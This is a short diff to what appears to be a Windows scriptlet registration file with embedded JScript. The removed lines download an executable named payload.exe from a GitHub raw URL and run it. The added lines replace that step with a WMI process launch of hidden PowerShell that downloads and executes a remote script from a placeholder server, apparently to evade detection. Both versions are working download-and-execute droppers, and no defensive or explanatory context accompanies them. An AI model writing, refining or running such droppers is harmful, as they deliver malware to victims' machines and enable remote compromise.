@@ -5,8 +5,9 @@
         classid="{AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE}">
         <script language="JScript">
             <![CDATA[
-                var shell = new ActiveXObject("WScript.Shell");
-                shell.Run("powershell -c Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/shiinayx64/inNCUEU2C8/refs/heads/main/Kasparov.exe' -OutFile $env:TEMP\\payload.exe; Start-Process $env:TEMP\\payload.exe");
+                var wmi = GetObject("winmgmts:root\\cimv2");
+                var process = wmi.Get("Win32_Process");
+                process.Create("powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://seu_servidor/payload.ps1')");
             ]]>
         </script>
     </registration>
